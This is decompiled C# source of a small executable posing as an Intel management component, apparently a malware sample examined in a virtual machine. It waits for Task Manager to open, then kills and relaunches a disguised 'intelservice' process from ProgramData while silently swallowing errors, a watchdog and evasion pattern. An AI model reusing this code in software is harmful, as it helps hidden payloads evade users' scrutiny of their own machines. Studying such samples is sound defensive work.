// Decompiled with JetBrains decompiler
// Type: intelmain.Module1
// Assembly: intelmain, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3933E1F4-7FB5-440C-9014-0BDF170FA1C9
// Assembly location: C:\Users\gorno\Desktop\vm\Intel(R) Management\intelmain.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace intelmain
{
  [StandardModule]
  internal sealed class Module1
  {
    [STAThread]
    public static void Main()
    {
      while (true)
      {
        try
        {
          do
            ;
          while (Process.GetProcessesByName(Path.GetFileNameWithoutExtension("taskmgr")).Length <= 0);
          Process.GetProcessesByName("intelservice")[0].Kill();
          Thread.Sleep(1000);
          Process.Start("C:\\ProgramData\\Intel(R) Management\\intelservice.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
